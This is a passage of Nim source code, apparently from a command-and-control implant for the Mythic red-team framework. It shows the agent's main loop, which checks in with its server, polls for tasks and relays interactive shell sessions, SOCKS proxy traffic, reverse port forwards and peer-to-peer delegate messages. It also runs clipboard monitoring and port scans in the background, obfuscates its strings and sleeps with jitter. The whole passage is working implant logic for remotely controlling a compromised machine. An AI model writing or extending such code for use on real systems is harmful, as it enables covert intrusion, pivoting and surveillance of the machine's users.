      # SMB profile doesn't do normal checkin - clients connect to it
      # Run the SMB listener loop
      case agentInstance.profile.kind
      of pkSmb:
        agentInstance.profile.smbProfile.start()
      else:
        discard
    return
  
  debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
  
  # Perform initial checkin
  if not agentInstance.checkin():
    debug "[DEBUG] runAgent: Checkin failed, exiting"
    return
  
  debug "[DEBUG] runAgent: Checkin successful, entering main loop"
  
  # Main agent loop
  while not agentInstance.shouldExit:
    # Get tasking from Mythic (returns tasks, interactive, socks, rpfwd messages, and delegates)
    let (tasks, interactive, socksMessages, rpfwdMessages, delegates) = agentInstance.getTasks()
    
    # Process interactive messages first (PTY input)
    agentInstance.processInteractive(interactive)
    
    # Process SOCKS messages (data forwarding)
    agentInstance.processSocks(socksMessages)
    
    # Process RPfwd messages (data forwarding)
    agentInstance.processRpfwd(rpfwdMessages)
    
    # Process delegate messages (P2P agent forwarding)
    agentInstance.processDelegates(delegates)
    
    # Process tasks
    agentInstance.processTasks(tasks)
    
    # Check active PTY sessions for output (non-blocking via threads)
    let ptyResponses = checkActivePtySessions()
    for response in ptyResponses:
      agentInstance.taskResponses.add(response)
    
    # Check active SOCKS connections for data (non-blocking via threads)
    let socksResponses = checkActiveSocksConnections()
    for response in socksResponses:
      agentInstance.taskResponses.add(%*{obf("socks"): [response]})
    
    # Check active RPfwd connections for data (non-blocking via threads)
    let rpfwdResponses = checkActiveRpfwdConnections()
    for response in rpfwdResponses:
      agentInstance.taskResponses.add(%*{obf("rpfwd"): [response]})
    
    # Check active connect connections for data (non-blocking via threads)
    let connectResponses = checkActiveConnectConnections()
    for response in connectResponses:
      agentInstance.taskResponses.add(response)
    
    # Check active link connections for data (non-blocking via threads) - Windows only
    when defined(windows):
      let linkResponses = checkActiveLinkConnections()
      for response in linkResponses:
        agentInstance.taskResponses.add(response)
    
    # Check background tasks (clipboard_monitor, portscan)
    agentInstance.checkBackgroundTasks()
    
    # Send responses back (handles background task state machine)
    agentInstance.postResponses()
    
    # Sleep with jitter
    agentInstance.sleep()


